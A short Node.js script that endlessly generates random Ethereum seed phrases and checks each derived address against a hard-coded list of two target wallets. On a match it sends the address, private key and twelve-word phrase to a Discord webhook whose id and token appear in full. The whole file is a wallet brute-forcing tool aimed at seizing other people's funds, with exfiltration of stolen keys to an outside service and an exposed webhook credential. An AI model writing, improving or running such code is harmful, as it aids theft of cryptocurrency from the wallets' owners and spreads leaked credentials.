"use strict";

const genEth = require('ethers');
const fs = require('fs');
const Discord = require("discord.js");

const webhook = new Discord.WebhookClient({id: "1156651435023409263", token: "6ZMqjcNnq1uHCtDrQDT_ku9qNaCGPYiapVIVeITnoXAonCEAkTvYIwqKxKIM75LmCqwB"});

// const riches = fs.readFileSync('./riches.txt');

const riches = ["0xB1e66855FD67f6e85F0f0fA38cd6fBABdf00923c", "0xf2D88a0cd6060b6A27EeA92A8Bf99E8fEE96DDb9"]

function generate() {
    var phrase = genEth.Wallet.createRandom().mnemonic.phrase;
    var wallet = genEth.Wallet.fromMnemonic(phrase);
    if(riches.includes(wallet.address)){
        console.log("")
        process.stdout.write('\x07');
        console.log("\x1b[32m%s\x1b[0m", ">> Success: " + wallet.address)
        successString = "Wallet: " + wallet.address + "\n\nPrivate Key: " + wallet.privateKey + "\n\n12 word phrase: " + phrase;
        webhook.send(successString)
            .catch(console.error);
        // fs.writeFileSync('./Success.txt', successString, (err) => {  
        //     if (err) throw err; 
        // })
        process.exit()
    }
}

while(true){
    generate()
}




